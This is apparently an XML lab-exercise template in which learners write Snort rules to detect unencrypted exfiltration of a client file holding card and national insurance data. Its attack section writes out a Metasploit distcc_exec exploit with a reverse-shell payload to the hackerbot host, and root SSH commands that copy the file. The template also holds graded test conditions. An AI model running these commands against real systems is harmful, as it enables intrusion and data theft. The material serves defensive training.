	<attack>
		<% $rand_alert1 = SecureRandom.hex(3)
		 $rand_tmp_restingplace = "/tmp/#{SecureRandom.hex(3)}" %>
		<!-- get the snort alerts before -->
		<!-- and make a copy of the file to a new location  -->
		<pre_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>clients.csv <%= $rand_tmp_restingplace %>; chmod 644 <%= $rand_tmp_restingplace %>'; stat0=$?; echo -$stat0; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
		<!-- exploit and read contents of sensitive file over the network -->
		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; set payload cmd/unix/reverse; set LHOST <%= $hackerbot_server_ip %>; exploit"</get_shell>
		<!-- trigger the rule by sending the data -->
		<post_command>cat <%= $rand_tmp_restingplace %>; echo --$?</post_command>
		<!-- get the snort alerts after, and diff for new alerts generated -->
		<post_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert1 %> >/dev/null; echo triggered:$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert1 %>' | grep -E 'protected_content ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
		<suppress_command_output_feedback />

		<prompt>Create an exfiltration detection rule that doesn't contain any of the sensitive data. Use hash-based matching. You have a copy of sensitive list of clients, containing credit card details and national insurance numbers, in <%= $sensitive_files_location %>clients.csv Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert1 %>".</prompt>

		<condition>
			<output_matches>good_rule:1</output_matches>
			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing *protected_content* matching or the message from your rule.</message>
		</condition>
		<condition>
			<output_matches>triggered:1</output_matches>
			<message>:( Your rule wasn't triggered. Hints: you don't know where in the packet the protected content will be so you can first have a content rule based on something you know will come first, and specify a distance between that and the protected content.</message>
		</condition>
		<condition>
			<output_matches>triggered:0.*good_rule:0</output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>--1</output_matches>
			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>-1</output_matches>
			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>--0</output_matches>
			<message>Continuing...</message>
		</condition>
		<else_condition>
			<message>:( Something was not quite right...</message>
		</else_condition>
	</attack>
